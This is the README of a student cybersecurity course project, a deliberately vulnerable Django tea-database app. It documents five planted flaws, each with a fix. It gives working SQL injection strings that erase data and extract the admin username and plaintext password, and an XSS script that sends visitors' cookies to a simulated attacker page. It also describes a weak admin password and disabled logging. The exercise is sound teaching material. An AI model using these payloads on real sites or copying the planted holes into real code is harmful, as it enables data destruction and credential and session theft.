# cybersecuritybaseproject
Course project for Introdution to cyber security

Project / flaw descriptions:

LINK: https://github.com/korolainenriikka/cybersecuritybaseproject

No specific installations / db migrations needed. Clone the project, cd to cybersecuritybaseproject/teetietokanta and run ```python3 manage.py runserver```. The app launches in [http://localhost:8000/](http://localhost:8000/).

a note on testing the injections below (flaws 1-3): the injections are highly dependent on the quote types used, be careful with copy-pasting. The exact working injection is inside the double quotes.

security flaw descriptions:

## FLAW 1: SQL injection vulnerability in tea insert form submit handler enables data erasure, encryption, etc.
* exact source link: https://github.com/korolainenriikka/cybersecuritybaseproject/blob/2f0970a2fc6ee4fdd777d39b4dde9a1a2f334661/teetietokanta/teet/views.py#L26
* description of flaw: The form submit is implemented using python sqlite3 library. A SQL command is executed with the executescript method, without a string template (simple +-sign concatenation is used), which enables a very easily-exploitable injection flaw. For example, when inserting the following site input: name: "tea deleter tea" and description "hyvä tee on joo'); DELETE FROM teet_tea; INSERT INTO teet_tea(name, description) VALUES ('hehee', 'maistas tuosta", an attacker could delete all tea data. Other, more severe injections such as DROP TABLES could also be executed, but if you try this, the other flaws cannot be tested with the same clone of the application, and you have to re-clone and launch the app (up to you, of course).
* how to fix: The most obvious fix would be to use execute() instead of executescript() and use string templates. However, because of queries such as UNION, some slightly more sophisticated vulnerabilities might still be left in the form handler. A fool-proof fix would be to use db operations supported by Django, in this case Tea.objects.create(name=name, description=description), as is shown in the commented line 30 of the submit handler.

## FLAW 2: Sensitive data exposure vulnerability: auth user credentials can be compromised with a SQL injection
* exact source link (same as flaw 1): https://github.com/korolainenriikka/cybersecuritybaseproject/blob/2f0970a2fc6ee4fdd777d39b4dde9a1a2f334661/teetietokanta/teet/views.py#L26
* description of flaw: a careless administrator had to note their password somewhere. As django by default only stores a password hash and the administrator thought it is smart to store password data close to where it is needed, the database has a table that contains the admin password in plaintext. The form submit handler makes it possible to fetch this password and other credentials from the password store table in a subquery. The admin credentials can be displayed on main page by submitting the form with two injection-performing inputs: first content being name: "admin username stealer tea", description: "admin username: ' || (SELECT username FROM auth_user) || ' " . The password can be retrieved with a similar query, using name: "admin password stealer tea" and description: "admin password: ' || (SELECT * FROM authuserpwdstore) || ' ".
* how to fix: obviously, store the admin password either in a password manager or memorize the password. Also the fixes presented in the flaw 1 section would fix this partially.

## FLAW 3: Cross-site scripting can be used to steal any site visitors' cookie data
* exact source link: https://github.com/korolainenriikka/cybersecuritybaseproject/blob/master/teetietokanta/teet/templates/teet/index.html#L16
* description of flaw: the tea app template does not validate form input to avoid injecting js scripts to the application main page. Therefore it is possible to submit a tea to the app that has a script in the description to, for example, send any site visitors' cookie data to a malicious site. The app has an sub-app simulating the attackers' own web page in url /blackhat/ and with the following tea form inputs cookies can be sent to this page: name: "cookie stealer tea", description: "an especially sweet n nice one! <script>var xhr = new XMLHttpRequest(); var url = "blackhat/sendcontent/?cookie="+document.cookie; xhr.open("GET", url, true); xhr.send();</script>". After this tea is submitted, the user cookie appears on the /blackhat/-page every time the tea app index is re-loaded.
* how to fix: django has built-in xss protection in the templates, which is disabled using the 'safe' -keyword in the linked line in index.html. Removing this keyword fixes the flaw.

## FLAW 4: Security misconfiguration: insufficient admin password validation
* exact source link: https://github.com/korolainenriikka/cybersecuritybaseproject/blob/master/teetietokanta/teetietokanta/settings.py#L89
* description of flaw: the password validation looks good on the surface, but it it missing one important validator: common password validation. Therefore it was possible to choose "password" as admin password. It would probably not require a lot of tries from an attacker to guess the right password and have full access to the admin panel of the application, where password can be changed, for example.
* how to fix: using Django default password config would suffice. The following validator config code snippet should be added to settings.py: {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},

## FLAW 5: Insufficient logging & monitoring: all logs disabled
* exact source link: https://github.com/korolainenriikka/cybersecuritybaseproject/blob/master/teetietokanta/teetietokanta/settings.py#L103
* description of flaw: as the application admin panel and terminal filled with arbitrary-looking data, the site administrator decided to change the site configuration to not display any of this data. Therefore no logs of usage of the site is saved, and no attacks can be proven to have happened as no 'digital footprint' is left behind in the application.
* how to fix: again, this flaw was implemented by disabling default django configurations. Removing the custom logs config altogether from settings.py (lines 101-104) would enable the safer default logging configuration.
